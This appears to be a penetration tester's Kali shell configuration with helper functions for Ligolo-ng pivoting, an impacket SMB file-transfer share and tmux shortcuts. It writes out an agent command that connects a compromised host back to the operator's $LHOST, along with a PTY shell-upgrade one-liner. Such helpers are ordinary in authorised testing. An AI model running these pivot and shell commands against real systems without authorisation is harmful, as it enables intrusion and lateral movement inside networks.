################### Tunneling / Pivoting ###################
# Ligolo-ng quick helpers
ligolo_start() { sudo ip tuntap add user "$(hostname)" mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert; }  # [pivot ligolo]
ligolo_client_echo() { echo "./agent -connect $LHOST:11601 -ignore-cert &"; echo "sudo ip route add <TARGET_IP> dev ligolo"; }  # [pivot ligolo]
ligolo_listeners_echo() {
  echo "listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:8000 --tcp"
  echo "listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp"
}  # [pivot ligolo]
ligolo_magicip() { echo "Local Ligolo Agent IP = 240.0.0.1"; }  # [pivot ligolo]


################### Transfer ###################
# Simple SMB server for file transfer (set SMB_USER/SMB_PASS if desired)
smbsrv() {
  local user="${SMB_USER:-kali}" pass="${SMB_PASS:-kali}"
  printf '%s\n' "net use \\\\${LHOST}\\share /user:${user} ${pass}"
  impacket-smbserver -smb2support -username "$user" -password "$pass" share .
}  # [transfer smb impacket]

# Cloud scp helper (set $SSH_KEY and $CLOUD_HOST)
cloud_transfer() { echo "scp -i '${SSH_KEY}' kali@${CLOUD_HOST}"; }  # [cloud ssh scp]

# PTY upgrade one-liner (echo for easy copy)
pty() { echo "python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")'"; }  # [shell pty]


################### Tmux ###################
t() { grep -i tmux "$HOME/.kali" --color; }  # [tmux grep]
nwindow() { TMUX= tmux new -n "$1"; }  # [tmux]
nsession() { TMUX= tmux new -s "$1"; }  # [tmux]
rwindow() { TMUX= tmux rename-window "$1"; }  # [tmux]
rsession() { TMUX= tmux rename-session "$1"; }  # [tmux]
attachto() { TMUX= tmux attach -t "$1"; }  # [tmux]
killsession() { TMUX= tmux kill-session -t "$1"; }  # [tmux]
attach() { TMUX= tmux attach; }  # [tmux]
splitup() { TMUX= tmux split-window -h; }  # [tmux]
splitright() { TMUX= tmux split-window -v; }  # [tmux]
tmuxhelp() { TMUX= tmux list-keys; }  # [tmux]


